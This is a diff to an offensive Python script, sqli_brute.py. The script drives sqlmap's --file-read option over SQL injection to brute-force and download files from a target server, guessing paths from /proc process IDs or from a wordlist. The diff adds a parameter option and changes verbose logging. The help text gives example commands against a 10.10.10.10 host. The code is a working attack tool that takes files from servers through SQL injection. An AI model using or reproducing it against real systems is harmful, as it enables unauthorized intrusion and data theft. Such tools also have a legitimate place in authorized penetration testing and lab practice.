@@ -18,16 +18,18 @@ class SQLiBrute():
     # :param requestFile: the path to the request file
     # :param threads: the number of threads
     # :param outDir: the directory to download the existing files
-    # :param verbose: if true than write detailed error report
-    def __init__(self,url,requestFile,threads,outDir,verbose):
+    # :param verbose: if true, then write detailed error report
+    def __init__(self,url,requestFile,threads,outDir,parameters,verbose):
         if int(threads) < 1 or int(threads) > 50:
             self.error("The number of threads should between 1 and 50!")
             sys.exit()
+        
         self.numberOfThreads = threads
         self.url = url
         self.requestFile = requestFile
         self.outDir = outDir
         self.verbose = verbose
+        self.parameters = parameters
         self.critical = False
     
     # Create /proc folder brute threads
@@ -117,10 +119,17 @@ class SQLiBrute():
         elif self.url != "":
             target = "-u " + str(self.url)
 
-        cmd = 'sqlmap ' + target + ' --file-read=' + str(fileArgument) + ' --batch'
+        if self.parameters != "":
+            parameters = "-p %s" % self.parameters
+        else:
+            parameters = ""
+
+        cmd = "sqlmap %s --file-read=%s %s --batch" % (target,fileArgument,parameters)
         cmdsplit = str(cmd).split()
         result = subprocess.run(cmdsplit, stdout=subprocess.PIPE)
        
+        if self.verbose:
+            print("%s" % str(result))
 
         if "[CRITICAL]" in str(result):
             if "does not exist" in str(result):
@@ -129,14 +138,12 @@ class SQLiBrute():
                 sys.exit()
 
         if "[WARNING]" not in str(result) and "ERROR" not in str(result):
-            if self.verbose:
-                print("%s" % str(result))
             self.existingFiles.append(fileArgument)
             words = str(result).split()
             i = 0
             
             # Iterate on sqlmap reply to find where the file was downloaded and
-            #move to the directory which was given from the user
+            # move to the directory which was given from the user
             for word in words:
                 if self.verbose:
                     print("%s" % word)
@@ -215,7 +222,7 @@ if __name__ == "__main__":
     header += "\n" + Style.RESET_ALL
 
 
-    helpMessage = "Syntax: sqli_brute.py -u sqlmap_url [-b filePath] ((-m p -s startProcId -e endProcId) | (-m f -w wordlist)) [-d outDir] [-t threads] \n -h: shows this help \n -u: The url to test. Syntax is same as sqlmap syntax. \n -r: The request file -m: The mode can be (p) proc scan, or (f) file scan. \n -s: startProcessId \n -e: endProcessId \n -w: wordlist \n -t: threads -d: output directory to move the downloaded files \n -b: Basic path to read from \n -d: directory to copy the downloaded files \n \n Example usage: \n sqli_brute.py -m p -u http://10.10.10.10/sqlquery/someparam* -s 1 -e 1000 -t 25 -d outDir -t 25 \n sqli_brute.py -u http://10.10.10.10/sqlquery/someparam* -m f -w ./linux.txt -x py -b /etc -d ./outDir"
+    helpMessage = "Syntax: sqli_brute.py -u sqlmap_url [-b filePath] ((-m p -s startProcId -e endProcId) | (-m f -w wordlist)) [-d outDir] [-t threads] \n -h: shows this help \n -u: The url to test. Syntax is same as sqlmap syntax. \n -r: The request file -p: Testable parameter(s) \n -m: The mode can be (p) proc scan, or (f) file scan. \n -s: startProcessId \n -e: endProcessId \n -w: wordlist \n -t: threads -d: output directory to move the downloaded files \n -b: Basic path to read from \n -d: directory to copy the downloaded files \n \n Example usage: \n sqli_brute.py -m p -u http://10.10.10.10:80/sqlquery/someparam* -s 1 -e 1000 -t 25 -d outDir -t 25 \n sqli_brute.py -u http://10.10.10.10/sqlquery/someparam* -m f -w ./linux.txt -x py -b /etc -d ./outDir"
 
     print("%s" % header)
     if sys.version_info[0] < 3:
@@ -233,6 +240,7 @@ if __name__ == "__main__":
     outDir = ""
     verbose = False
     requestFile = ""
+    parameters = ""
 
     for arg in sys.argv:
         if arg == "-h":
@@ -248,6 +256,8 @@ if __name__ == "__main__":
             url = str(sys.argv[counter+1])
         if arg == "-r":
             requestFile = str(sys.argv[counter+1])
+        if arg == "-p":
+            parameters = str(sys.argv[counter+1])
         if arg == "-m":
             mode = str(sys.argv[counter+1])
         if arg == "-w":
@@ -262,7 +272,7 @@ if __name__ == "__main__":
             verbose = True
         counter = counter + 1
 
-    SQLiBrute = SQLiBrute(url,requestFile,threads,outDir,verbose)
+    SQLiBrute = SQLiBrute(url,requestFile,threads,outDir,parameters,verbose)
     if url != "" or requestFile != "":
         if mode == "p":
             if startId != -1 and endId != -1:        
